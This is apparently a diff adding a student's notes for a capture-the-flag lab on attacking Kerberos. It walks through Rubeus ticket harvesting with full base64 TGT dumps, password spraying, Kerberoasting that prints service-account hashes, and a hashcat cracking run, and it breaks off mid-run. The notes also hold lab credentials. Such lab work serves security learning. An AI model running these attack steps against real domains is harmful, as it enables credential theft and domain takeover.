@@ -1,0 +1,648 @@
+This room will cover all of the basics of attacking Kerberos the windows ticket-granting service; we'll cover the following:
+
+  1)  Initial enumeration using tools like Kerbrute and Rubeus
+  2)  Kerberoasting
+  3)  AS-REP Roasting with Rubeus and Impacket
+  4)  Golden/Silver Ticket Attacks
+  5)  Pass the Ticket
+  6)  Skeleton key attacks using mimikatz
+
+
+---------------------------------------------------
+----------------
+1)ENUMERATION 
+----------------
+export IP=10.10.42.158
+
+creds provided = Administrator:P@$$W0rd 
+Domain= controller.local
+
+trying to ssh into the system;
+
+┌──(sypher㉿kali)-[~]
+└─$ ssh Administrator@controller.local
+The authenticity of host 'controller.local (10.10.42.158)' can't be established.
+ED25519 key fingerprint is SHA256:MJ0mfCQOQV99jJLs4F9riigTRyr0ECpBPVSQrP0jz80.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'controller.local' (ED25519) to the list of known hosts.
+Administrator@controller.local's password: 
+
+Microsoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+controller\administrator@CONTROLLER-1 C:\Users\Administrator>
+
+-------------------------------------------------------
+Rubeus is a powerful tool for attacking Kerberos. Rubeus is an adaptation of the kekeo tool and developed by HarmJ0y the very well known active directory guru.
+
+so now we are going to 'harvest' tickets with a tool called Rubeus;
+
+Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.
+
+1.) cd Downloads - navigate to the directory Rubeus is in
+
+2.) Rubeus.exe harvest /interval:30 - This command tells Rubeus to harvest for TGTs every 30 seconds
+
+ontroller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe harvest /interval:30   ______        _  (_____ \      | |   _____) )_   _| |__  _____ _   _  ___   |  __  /| | | |  _ \| ___ | | | |/___)  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/  v1.5.0 [*] Action: TGT Harvesting (with auto-renewal)        
+[*] Monitoring every 30 seconds for new TGTs[*] Displaying the working TGT cache every 30 seconds [*] Refreshing TGT ticket cache (2/26/2022 10:32:27 AM) 
+  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL  StartTime             :  2/26/2022 10:07:45 AM  EndTime               :  2/26/2022 8:07:45 PM  RenewTill             :  3/5/2022 10:07:45 AM  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable  Base64EncodedTicket   :    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr 
+    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEtYoNIUZqfvgzVdWk+02Vi/XHZ9VFIp3wkAK     DEFKEU02u0W6NznVw5rFEhfjBT0vF6fnYa2nleRhpCN8o8HdxAp0bdl3jUGF7KR9kpsThzP5kqm72Qwh4FL8kKE6SPhcdQXM6Tyn     eltQA6pMd0VNxvm3C+yxXyADktD6k7LKHyztCTkl7AJJOaWnG7YcGC0Od+p7gTMyO6ZPZtopY0oFFl86lRUTmjdY3DyhTrJWj3GR     6ja1Gf8MkO+V42/HYARTSHkDqK9jB7Sq/hgYQYIDAseOXh6DAk+dxvmcHdSGOvGFJHipCmV9HIGE5zWjTw+DgiTRTpAKtZ6oYqGH     XqFEobmpyg87baZoTIhWSTH3L367fa7wlISzH+o3wKJOq/cuVEaRCAbugVHnrNbbmyK4uY0m6eVuyk4H/o/ZG6sXbD+zigNRk3yt 
+    u7o3swvLHRQd++cuKGcA2Q/ohv3jsjxq4V30O+Ik8zwhkopShq0dvlpbupkpJDKwlEq4KqtFXR3YzDDnFMLmhjvLMTkzP91nAvag     VF/E9NGoSq6FO1FwlgaJ2L/TxfXBYmLEustfIV8p2fwCTKy4N7m8UiOCZmAvo4j2WYnW6tskG5tHVOCB8c1lrz9TmvdaN4x2EolR     IeTn2NE0/UkiwUZIKp8SWt2BAJ8iFtWCLHUZmlxQhyExY2FILYXweMftw1ka2pPfBoKbDT2OltcbG2phcb/oX55kGdEuETuOEo3i     x40/jfIohDG2uSEP43MQ7EIYgk8iaUQI2CLdXRyBnAmI64bngIK4vbX73fWqIkxvjMRZrshd7IDpLwGxzXLJgSeVAni9wupJh39c     SItAJi1v7aEyP7Fnx0Dy1DPYCGkHDl2/RLOWaNlJKSHGlXIcN1FZfE4hqUGNpGy9jgiLrWoN/H66ntIW6Ng+vdVl13DHQXARfRbh 
+    4VSroZ2OF6Hl/4enKSeDB6zMzvVWWcsTkkBYnz3vfXsbKHbt1ikQhx668g4w3tbeNBwD2Blg/4oCw+PmOTtwtQOkxAPdPDTR9vuJ     ERTh39uWgWjkx4P+huefxJJ1HfDDj369yyWBIQZD0HBlYebdrwz4f+WY+a5QqtZ2Kgbetu0qNQeHspFKiB0E4MrB35WDQJz4phfF     x22FyI9H/cLDfFHpExmeEAJNozCgzONmWTtQdN0eqZT37xeBH8ndYeSdz59k7X2vcMHOe1CGfF035Nz0lY9DyZHI/8tfCZcnhNkI     6tLRpvkIPMCT09NHLKci6MRuzJPLHHRp+OoiW4n19yrtrPPuFxqezMQWtJ4EuibRw/5whp+glgeQFL+fSYD5GV+lCFs9jOecXN0e     ahwkNZJ+HznWF1A+zVfa87qF09ASeYS/YnC3lp3Wl2LyKX/p1jmTNi2jgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr 
+    MCmgAwIBEqEiBCAL9ltSI53gd2Na7BbGe1HMYK1pnKQC0HoKaFm+CNHI+KESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw     DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIyMDIyNjE4MDc0NVqmERgPMjAyMjAyMjcwNDA3NDVapxEYDzIwMjIwMzA1     MTgwNzQ1WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM
+  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
+  StartTime             :  2/26/2022 10:07:45 AM
+  EndTime               :  2/26/2022 8:07:45 PM
+  RenewTill             :  3/5/2022 10:07:45 AM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+
+    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
+    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEkiqeKRYukl31Vu9wcPHgDyIAfG8WRJ/KuCz
+    s5sw+uVrn2Mp53GDzhmhT9wKVOC78+y0N4L2BuiRAN/3eAZTUBX7jklfg2/s2p2pm2KFaRUHSDcJHYlLTTrK2t/DVYw8je+MB/jG
+    uX1f/rXTJfuIjt8eZfafOZzpGvK4onf+ynDUzpn34jgDrYxc3DwTef0RPthYB6NBHOKyRPSj3l3nUxAicd9ZbSidI2INtRPrHHDL
+    43pXPPDeHNyxIt2a6ctxfBslQSYV7qYb1/6nrRdd6zbXrFqqeZojGNdncM6pXbPxsChgdekk1zwDJ2CrxoPuznQrZRspR2piDnLm
+    qkWDehrV35NjQHQT8yevKtbgkUqjutA43fW4du26t5DfcptJ9eagQZu1d7rqK/xDDnIOX7DfaZ1YawjpuUbIke8NgRY8Ol5httmr
+    CEXG+5laKHxbZ0cRChzwFcrXBbLinR2+QeKsOosTq88UTebwHjKLAYjXIEnoxGeUIpMVG9UmygtCtGT3k7ivZBFWBmf9ECI/aQpT
+    oDr8tn9qZ2JtpGdLJJyUDCsHZ/J4fMQcwzow90qJ6dy8E7xNGcksUZFIOf80msL3q+VQfvs8LiKw2nRX17d2FT5AQjrjtcJyzF+4
+    yfD62H4zR18AR4nnKBI17asyR3Tip3peKjEUvxI88tPhnAGS92IxqZ3Z/3RjGgMpeGbFyNIFHbvYY2gDO4CPQTyQ0epGd5vVOuK3
+    OeBxPrFYuGHy1lBZG9DCpsl+9B5D1qURxTH6qw9hLQi8z7f4pzzY5C/MRO+YcTrxHCgOR5gz1ZKpSyP43RZZCA31lXxhC4pb+jE9
+    jrmOZTeWpK8701bpvw0wWqUigUUYcZUye+hf60FoPseeIB0qcgEI9U5yDRRyUSvMzIcWsNedVEQpIOSX67mqofeKY4EqJkQJ0Woz
+    +yD7dqcIdYO8twf6I8p8wLIb1RF+MWCbXcVtM5BrgqxOmQ0sooNBbTBfqexaTqQZyqFZhO2x/gQpKVGYKGgt57AWjPmUEQl32wWz
+    xyHmZfhTizP8eXJPq0ReesXqpGUIUjWuxxbiQ05i8Gr2CNRkSKIRW1VV3jBTe/tFAeghzPniN2Mq2IjyVuwCMEaeo/eyP2GgC/aR
+    rizwyI0Q6knrl2ekqkixB93JuTwtHgIlM0o0v43lV4cJt4H11cRaOCpDamw9H3AfuCV+POPy1HbLsXfHnZVfuinWsXzPlQQ5B5y3
+    XmXZ9YEAGvWWLwFv2WtbK/PdJKtqucJH1QODGt9cGEmO9syI6vmNuYDV9zRCoaMfLjPFB5jDR/K36hRXE+FBbfVnnQxFsP57lB9+
+    P9HuzB/BCPux147CVf4SLfLIuBmMoFaRWpXMVjs9zHlOtUMFJ7rqbW6jgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
+    MCmgAwIBEqEiBCDDhIajhh5YZcFw/BEJiH3pCtoCqgNJ50+EtSbbaNHZCqESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
+    DxsNQ09OVFJPTExFUi0xJKMHAwUAYKEAAKURGA8yMDIyMDIyNjE4MDc0NVqmERgPMjAyMjAyMjcwNDA3NDVapxEYDzIwMjIwMzA1
+    MTgwNzQ1WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM
+
+  User                  :  Administrator@CONTROLLER.LOCAL
+  StartTime             :  2/26/2022 10:19:35 AM
+  EndTime               :  2/26/2022 8:19:35 PM
+  RenewTill             :  3/5/2022 10:19:35 AM
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  Base64EncodedTicket   :
+
+    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
+
+[*] Ticket cache size: 3
+[*] Sleeping until 2/26/2022 10:32:57 AM (30 seconds) for next display
+--------------------------------------------------------------
+
+we got tickets for controller-1@controller.local domain.
+
+now we are going to try and brute-force a users password using rubeus.
+
+This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.
+
+Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command: 
+
+echo 10.10.42.158 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
+
+1.) cd Downloads - navigate to the directory Rubeus is in
+
+2.) Rubeus.exe brute /password:Password1 /noticket - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user 
+
+controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>echo 10.10.42.158 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
+
+controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe brute /password:Password1 /noticket
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[-] Blocked/Disabled user => Guest
+[-] Blocked/Disabled user => krbtgt
+[+] STUPENDOUS => Machine1:Password1
+[*] base64(Machine1.kirbi):
+
+      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
+      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx      BIID7RwIVudPaXIqWkJz7YZNGe72VeeQsKJcHesa93aMzO6ZSnKZ3PW4MmnLDVOWjfOwLUklgrmp6CBF
+      nrpRp8Ca0P+wM5HTogqDpALP/rsrdGg+DGfAL0HWCVenS7EQ7OJinJMC3V3tsvDLCIiHHt9RgEURQNtO      SKnd/OUhjNac19jbAVxaNsfzziqtTCHMNlP4e264hVbBgxm2HJBBN9Uj7iZtxdZvhIS/CGKmi2Tp9LMW
+      vH9V8DS+LTD7Y4H8tlRWWhYVKVLa6jFClvLp6WAmhcXMy56auUtIzIXwnbAabD9aTkOiIKjiEfQJ2/M7      vrjecT1s5c6xQLfuZzjHOX4idqtW+eNz4Yzlasrdl8NIM+Dkf/x6FEhyWsrYhnnwWAe37usJjo49uJ+E
+      6UshDjPjvTzpL7UvOrVaQCxVYiKUSFZGx+IlKWqN9TRLB0oajouZ41AdeJJPqQFKqQuFVxThrx71bGht      wiOLIBAKsrICCEYnnZvKUEt75hv1P+nmXiyvJACJSDA+iVvhrg0lE7kgyFzvA648lff94LtpKo27Crga
+      5ci2oOStWzuaiSaZoXF1Yjoyjs4QtloH08KBuF5+U+iyRdtXdEdnTG7/Lw1HJqMozjBT+Z3UUEN5OI/F      eZybOVmdFpdQR2jTncK7/LKgKlJiyBYw+wPImJf38D05GyJtGogtTo60HQKArLQo9cjcSz79Fy1QU1aZ
+      HW7+JHWB89abe/ChZixhLQcjrhE5Z6QbsnZPbREDXTgAvXovgXqh20YrvmJyYhWCvurBxUQpwK3uNE0n      xdNYyFx0Q6P54xXxsclzfeqvbriJLv0qhx3J9p8PBVgC/v6DFxPQbqFkSd4ZfNJwE58UlC6pFyQYTkMp
+      XWsXxNbBzJA6finkAtyhfrEmNguzZfQD3GLwk1jo49yiyA01949I9lr1KwXjgnkbLIpeiwME+Nt7JIxb      QrYoLV+Y4wGdax6KTNbDOPQAdd010F47S1UOFJzWPy1wl1cZpz1jgdodv+L4EQ1SfQUdcrrss+ioPl1B
+      VLH1Oc3hu82palSDf53BLVmVlbrtTltkF3fPIp2QArgl+B08GU4/sScpe0gQHGxJxLy+JYwcfMFfIsi7      A+wd9dp5CLhr7soR/WkcM26x+CbPlEOWLUdNVOfU/PCDItNPz6sLomEPjBnrjdYI0dqGm3Jg5Mdfjc1/
+      We8bbVD+bEnOejgznLTTMDSsom2q/GMARlqBv+4Cr+v7nFjwisLWna3+1DUSqQSTpMuAqzHoWMrJSCTq
+      +u1/tlnHdoFALvH09t9Yr+FimA7XwmyI2KwICFx8FrpsSlaB6v25w2ZJ4+VLzH4x/KOB8jCB76ADAgEA
+      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIG2dpipJFbHF6zTqf+g7os4Bn16BdNNll23I
+      Jonziu/KoRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
+      GA8yMDIyMDIyNjE4NDMxMVqmERgPMjAyMjAyMjcwNDQzMTFapxEYDzIwMjIwMzA1MTg0MzExWqgSGxBD
+      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs
+
+
+
+[+] Done
+------------------------------------------------------------
+---------------
+2)KERBEROASTING
+---------------
+TASK 4
+------
+
+now we'll be covering one of the most popular kerberos attacks called kerberoasting.
+it allows the user to request service tickets for any service with a registered spn and then use the ticket to crack the service password.
+if the service has a registered spn then it can be kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account.
+
+To enumerate kerberoastable accounts we can use Bloodhound. It will allow you to see what type of account you can kerberoast if they are domain admins, and what kind of connection they have with the rest of the domain.
+
+(both of the tools used below are for kerberoasting)
+
+TOOLS being used= Rubeus and impacket.
+impacket can be found at /usr/share/doc/python3-impacket
+----------------
+Kerberoasting w/ Rubeus - 
+
+1.) cd Downloads - navigate to the directory Rubeus is in
+
+2.) Rubeus.exe kerberoast This will dump the Kerberos hash of any kerberoastable users    
+
+controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe kerberoast
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___  
+  |  __  /| | | |  _ \| ___ | | | |/___) 
+  | |  \ \| |_| | |_) ) ____| |_| |___ | 
+  |_|   |_|____/|____/|_____)____/(___/  
+
+  v1.5.0
+
+
+[*] Action: Kerberoasting 
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts. 
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. 
+
+[*] Searching the current domain for Kerberoastable users 
+
+[*] Total kerberoastable users : 2 
+
+
+[*] SamAccountName         : SQLService 
+[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local  
+[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111 
+[*] PwdLastSet             : 5/25/2020 10:28:26 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca 
+                             l:30111*$1771A8CFF6DB5B767414E0B50245215A$CC6ECA887F4FE5066082CEF93ED777A7615CF8 
+                             EAEA53CC5560E261D330797057959F36F52175654DFEF78222D691F88F36DBE8E2E0CA2D93F3E12C 
+                             9B9570721BC94673DFAFC876DA600177E116A90488E91DC7505AE1F3BD8770089BDC6BD3CF3930CB 
+                             D796B4EE39D19822480B432DA6D3120E8F65612916240B98386EAFD6B23D8DE48AD6DD6A5662BE8C 
+                             62FF1DD0F4FAFAAE126DD16F3F03BF63B6DBEA8DF7177CB513C36DD0D67CFE7F453733C752FDCBB3 
+                             B38384424E67E651C93BB0A9FA10C2CAFAB22AE2507EED7732A672C40D9C3715A21680CBB2CB853D 
+                             0150CC00F1404740905C0056D0F2216D8E3837319FA1DC3CD664FB61B1245F82A3109810238D64DA 
+                             51A552F0ED652269663E2B1ACB4FA8E02D7930D399A8E043D4D3ECA60F21AC16B54468D81F3A2EC4 
+                             E00D5F2F1CC8892D941D9954F0DEC89400CE4397B7755E4E79F4A09EFD87CB9F2203FA55B67C88F4
+                             8444D89EE69D4F0DAB89017A479CC449A73F89F6ED1748A4AD2F72A11F19CDD36B6AA6E48B645208
+                             8D616287FCB3A47E4C2F7659F33E58CE40CF35E9D5C5E29262B283213C0130FA39B9D37AF4E81469
+                             C766353939D525426F85B1E1ABC9D7EFFECB70C22B7AA70D86E147F9C557162E055BB059678CFFCC
+                             FCEABEF70D6F2A950D9FDBAB85720C2C456E764DFFB77E5653E5B5DB71748EF164751CF998C0FA35
+                             5C73BB6054A0C2190C758278B0E8C0911CA53D2D21827735FF8D2448023AF17B7CA0F2113CFD33DA
+                             946B80A368A69C888A7AE6849FC1A2649AFD8DA57FD4245D04BA8B556630FB99DA4C0CA215A037FC
+                             824251CC887BD63B73119FF56B6E0D65B8AFF5E37198A4B4C374828E4331023C2353107B8296954A
+                             70FB4B2E5D51143E2B001DA46B6A3C606F0257688E3450B008F93E388188068582B3448FEA779E53
+                             F281084CEAA2AEADF170CAB9BF39EFE61841231AA2FE3B3DA10A197DA0C1A623F7BE4ABABC86E45B
+                             923211D054C0670FCEA49B9414AC4BB99382FD7E8DC231C99EB8F21744BF114418FC435E84DF1AF7
+                             089724B2D5584C7A0C041948445AFE870CC102D4745E4CF7FE0D305DFCA1BB24B3E7CDBA3ADA2B9B
+                             14D674D1D7B07B3564562CD859757D35C5EC08A331235473FC2E7A2219C48A43F73FA7CA5556BF87
+                             E329B90D021BD45C488DA4EE68D1982D2D7198C58788A9053BED50D863E22E4BEE409797044A2736
+                             9A96C2165C83D09607D53A2B39434836A543A8953E7E2172CB95DE6447B33F9398C3156A3832641E
+                             217C35A58703A50E809A48643CCBBC05AB07C85AFEB41BE8F256EF78D67C07E0155EAB80634112AB
+                             4407060E7DF991ECB8562174EA57414D167E4DA983741EF64F919F4DE82A7B7AD266DEB7F4EAE6D7
+                             BADA685F288340FB88B1178F8B3662CC3EA3BA716C73BE688430B35D7607E34E94F0F6AC38385BF9
+                             E0A1B550B336E7B0D57B62D15D8C46FBD6E2381E2885A14111B54924735F6B14F91BFE88F55495D2
+                             8CF81A809889140842E5A65DB3795AA0A0AEE284E5E0ED9CCFE86E9FC112642549A81C6327B5C259
+                             558D5F6FFF5601C3159CA25E69BC69C6A17A57B7AAA1392A66DD89F2FBD8371EB8772BBF6E936654
+                             BE25E0CEF4D71B6B1763F7D97B9CA4E3699A285DE2C3E3E9D13115A4A6
+
+
+[*] SamAccountName         : HTTPService
+[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
+[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
+[*] PwdLastSet             : 5/25/2020 10:39:17 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo
+                             cal:30222*$7B0D84F66734386D66B26519498EBF42$2FAEA7D145CB14E5C010FEBF78C890EBF55B
+                             3846ED09C8052D78EDA50F97C8C5F7AD4410573E94674DADC53303C664CB9D4F981831AD740ECA31
+                             BC7CAC9CA477FCE608D7B512A3BE934CD2638A35E49A4E4A77848889477F4A0A111BFA0BD3CA3936
+                             6B77558B1DE31979535FF6B0FD0655D8BDA9C7504E531E83587AC6344819B8770BBB28399DE87405
+                             705A9C2934767B2156B2FC43D18E123773630207ED52A83E9AA6B8A582A7037CC6C12C40855D4BCF
+                             55C68BC515FED0754C80AE75B8D01B75BE47F3E11875B3047EE16AEE668CED09093C797AC3B1AEB1
+                             5EA2D2E9246ABB909E098BE32CABEF46DC6AB31339126B652EF6CC9A3C8B9B6178A69B30BBEFF46B
+                             F5BA55A03F1652B31C29C1CBBF1F765A2768FD71BBEBF502F447F332A2753EC4DB33F1210D9FC617
+                             BBB03B6FEBF2249475F42B83746ADEAE4D6E1A3A6397D74111DE4B46FF2B0F58058F36BDBB8F5FC6
+                             D464C7AAE5756274246ABACE74645ABC484CCF5C87ED6F04E470058D4E42B95A41627236A00949CA
+                             E193879F5EEE643758640D856F874F32C15AF6E14F96CF7CA802167DE535F11F9874E12BA8382B9C
+                             0897CD228DAC6201686A15A0B68720D3E382530EA7C29183FD6A3FC8882186A04B0DFAA5758E1A45
+                             E5F73F521F057074E0C68CD32A29622E06B4A5F28B03DB7660BCF591AA5D602DBB053FAE973E8DE1
+                             106B28AEBD829A4348BD82C0DC114B966398AC7223DF80152E0EC75E9CFC5DF31E548E863C5C1DB4
+                             FBFD89ED6E5EF9BE127FBD19DD67E7655A05C637C7896DF6E0E92D71D76D43E6469FCD2BBF47D295
+                             F2B96F94B40F36656531B9FF26CDB35AE843A182D5F5C7F6AF9A988721ED80F3846972183919F4D1
+                             EBCBE7F14C75F19C9881420A20031DEFA0CC216EC99E1C4FA1C8ED280467E047EE8010B7D5EE06BB
+                             4EF6DEE9D2C2E316FF48E77F2B1BB89DF82177BE6F02B83E054A18CD8863A7169116AB82BACF477C
+                             E680F2CE0BF1E47D1ACE9ECC26EF851154612B4D7CD4AECA6545B94115843D4DB1A58A3C4B90AF59
+                             D23D76E1E70E1AD007F919B4CAFBBA0F3E91AFBB0D9D1CB455131D00110F1FC2697D39E6DE9E2D6B
+                             C36A7B2A5E7EF0614B774B3F9355E9B6557BC5EB84B0364FA0E6C6753EA5890CF4E0062543AFDA99
+                             A48EF85DAE3E5740F86DC809F9C9E2AEC05FB7F94600CA089C64B2124ADAD828954A22FE4122F894
+                             A7CC3C3933A1D59056623B06300AE8E5EE391D7C64CDEE1D962847026F809294BE13BA9983CD79EC
+                             B1487D82F508724975B1E2FC461AF8ABA8B4BFD6529260C8869F8CF04B04C308A7CF7366763D40ED
+                             E303875CD0E63B49A70065356E6ED039DCCBFBF66FBC813119F1372D322DF7CDB9A9B7457B54D41A
+                             DA6170DADFB5977923B094101CFB11169AFEDFD84E33809EB95BFEF5A39EF77FD10E10B0C11BFBFE
+                             9B0F5AE426FEEB52835F764FB27AF7A8A4EFA1EE922E9D3EC869E8ADDCE6EF3A78ED613FAAC7CEA3
+                             8984CD527968F05EDDEEC15CC4E1ABA98C1FC57BB855E4D6C230D1C1FE9C219D8DE2DB5A5804FE7D
+                             741AACD8289FBB5C1CEF9F153AE1C32F68CD5FE8643CBB438E727875C353CB421AED70D0F8C61745
+                             902F46DB40EE8F351A3DE2247FDDBC2180BFFD30672F9CED52F257AE4AD0
+
+
+----------------
+
+after we save those hashes in .txt file, we are gonna try and crack those hases with hascat
+
+#syntax
+hashcat -m <model> -a 0 <hash file> <password list>
+
+
+┌──(sypher㉿kali)-[~/thm-rooms/attacking-kerberos/hashes]
+└─$ hashcat -m 13100 -a 0 httpservice-hash.txt ~/thm-rooms/attacking-kerberos/Active-Directory-Wordlists/Pass.txt
+hashcat (v6.2.5) starting
+
+OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-cortex-a72, 1438/2940 MB (512 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
